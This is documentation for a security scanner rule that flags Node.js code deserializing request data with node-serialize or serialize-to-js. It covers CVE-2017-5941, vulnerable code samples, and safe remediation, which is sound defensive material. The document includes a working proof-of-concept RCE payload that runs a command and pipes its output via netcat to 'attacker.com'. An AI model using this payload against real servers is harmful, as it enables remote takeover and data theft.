---
title: "VNX-NODE-017 – Deserialization of Untrusted Data via node-serialize or serialize-to-js"
description: "Detects use of node-serialize or serialize-to-js to deserialize user-controlled data, which allows remote code execution via embedded JavaScript IIFE expressions."
---

## Overview

This rule detects imports of the `node-serialize` or `serialize-to-js` packages and calls to their `unserialize()` or `deserialize()` methods with user-controlled request data. Both libraries support a dangerous feature: they will execute any JavaScript expression wrapped in an Immediately Invoked Function Expression (IIFE) that appears in the serialized payload. This means that an attacker who can supply the input to `unserialize()` can embed arbitrary JavaScript — such as a reverse shell command — inside the payload, and that code will run synchronously on the server when deserialization occurs.

The rule matches any file that imports `node-serialize`, any `serialize-to-js` `deserialize()` call, and any call pattern where `.unserialize()` or `.deserialize()` receives data directly from `req.body`, `req.query`, or `req.params`. This covers the most common attack surface: API endpoints that accept and deserialize user-supplied data.

The underlying weakness is that these libraries conflate data and code. Unlike `JSON.parse()`, which operates on a strict grammar with no executable constructs, these libraries extend the format to support JavaScript functions — and functions are code. Any deserialization library that can execute code must never be used with untrusted input.

**Severity:** Critical | **CWE:** [CWE-502 – Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## Why This Matters

The node-serialize IIFE exploit was disclosed in 2017 and demonstrated complete remote code execution on any Node.js application that deserializes user-controlled input with the library. The attack requires no authentication and no prior knowledge of the application — an attacker simply sends a crafted JSON payload to any endpoint that passes the request body to `unserialize()`. The exploit is trivial to reproduce, widely documented, and continues to appear in production applications.

The impact of a successful exploit is full server compromise: the injected JavaScript executes with the same OS-level privileges as the Node.js process. In containerised environments an attacker typically follows up with a container escape. In serverless functions a compromised Lambda or Cloud Function can be used to exfiltrate environment variables containing API keys, database credentials, and cloud IAM tokens. In traditional deployments the attacker gains a persistent shell.

The CVE-2017-5941 advisory for `node-serialize` was published eight years ago, yet the package still appears regularly in dependency trees due to transitive imports. Developers who inherit these dependencies may not be aware that any request path passing data through `unserialize()` is a critical RCE vector.

**Severity:** Critical | **CWE:** [CWE-502 – Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## What Gets Flagged

```javascript
// FLAGGED: importing node-serialize — any unserialize() call on this object is dangerous
const serialize = require('node-serialize');
const obj = serialize.unserialize(req.body.data);

// FLAGGED: serialize-to-js deserialize() with request data
const serialize = require('serialize-to-js');
const result = serialize.deserialize(req.body.payload);

// FLAGGED: unserialize/deserialize called with request-derived data
app.post('/load', (req, res) => {
  const data = obj.unserialize(req.body.state); // direct request data
  res.json(data);
});
```

Proof-of-concept payload for `node-serialize`:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id | nc attacker.com 4444')}()"}
```

## Remediation

1. **Replace `node-serialize`/`serialize-to-js` with `JSON.parse()`.** If you only need to transmit plain data objects (no functions), `JSON.parse()` is a safe drop-in replacement that cannot execute code.

2. **If you need structured serialization, use a schema-validated format.** Libraries like `superjson` or `devalue` support richer types without executable constructs.

3. **Never pass request data directly to any deserialization function** without first validating the structure against a schema (e.g., Zod, Joi, ajv).

4. **Uninstall `node-serialize` and `serialize-to-js`** from your dependency tree. Check for transitive dependencies with `npm ls node-serialize`.

```javascript
// SAFE: use JSON.parse() for untrusted data
app.post('/load', (req, res) => {
  let data;
  try {
    data = JSON.parse(req.body.data);
  } catch (e) {
    return res.status(400).json({ error: 'Invalid payload' });
  }
  // validate data shape before use
  res.json(data);
});

// SAFE: schema validation before use
const { z } = require('zod');
const schema = z.object({ userId: z.number(), action: z.string() });

app.post('/action', (req, res) => {
  const result = schema.safeParse(JSON.parse(req.body.data));
  if (!result.success) return res.status(400).json({ error: 'Invalid input' });
  // use result.data safely
});
```

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CAPEC-586: Object Injection](https://capec.mitre.org/data/definitions/586.html)
- [CVE-2017-5941 — node-serialize RCE](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [npm security advisory for node-serialize](https://www.npmjs.com/advisories/311)
